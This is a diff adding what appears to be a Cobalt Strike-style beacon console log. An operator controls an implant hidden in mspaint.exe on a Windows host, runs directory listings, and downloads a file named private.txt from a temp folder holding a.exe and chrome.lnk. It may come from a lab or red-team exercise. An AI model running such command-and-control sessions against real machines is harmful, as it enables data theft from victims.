@@ -1,0 +1,43 @@
+12/23 10:40:40 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 7692; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+12/23 10:41:03 UTC [input] <neo> ls
+12/23 10:41:03 UTC [task] <> Tasked beacon to list files in .
+12/23 10:41:35 UTC [checkin] host called home, sent: 19 bytes
+12/23 10:41:35 UTC [output]
+C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX1\*
+D	0	12/23/2022 17:39:35	.
+D	0	12/23/2022 17:41:24	..
+F	927232	12/23/2022 17:37:50	a.exe
+F	2319	12/21/2022 17:16:19	chrome.lnk
+
+
+12/23 10:41:46 UTC [input] <neo> pwd
+12/23 10:41:47 UTC [task] <> Tasked beacon to print working directory
+12/23 10:42:35 UTC [checkin] host called home, sent: 8 bytes
+12/23 10:42:35 UTC [output]
+Current directory is C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX1
+
+12/23 10:43:11 UTC [input] <neo> ls
+12/23 10:43:11 UTC [task] <> Tasked beacon to list files in .
+12/23 10:43:35 UTC [checkin] host called home, sent: 19 bytes
+12/23 10:43:35 UTC [output]
+C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX1\*
+D	0	12/23/2022 17:43:09	.
+D	0	12/23/2022 17:41:24	..
+F	927232	12/23/2022 17:37:50	a.exe
+F	2319	12/21/2022 17:16:19	chrome.lnk
+F	0	12/23/2022 17:43:06	private.txt
+
+
+12/23 10:43:37 UTC [input] <neo> download private.txt
+12/23 10:43:37 UTC [task] <T1005> Tasked beacon to download private.txt
+12/23 10:44:35 UTC [checkin] host called home, sent: 19 bytes
+12/23 10:44:35 UTC [error] File 'private.txt' is either too large (>4GB) or size check failed
+12/23 10:45:02 UTC [input] <neo> download private.txt
+12/23 10:45:02 UTC [task] <T1005> Tasked beacon to download private.txt
+12/23 10:45:35 UTC [checkin] host called home, sent: 19 bytes
+12/23 10:45:35 UTC [output]
+started download of C:\Users\NITRO5~1\AppData\Local\Temp\RarSFX1\private.txt (17 bytes)
+
+12/23 10:45:35 UTC [output]
+download of private.txt is complete
+
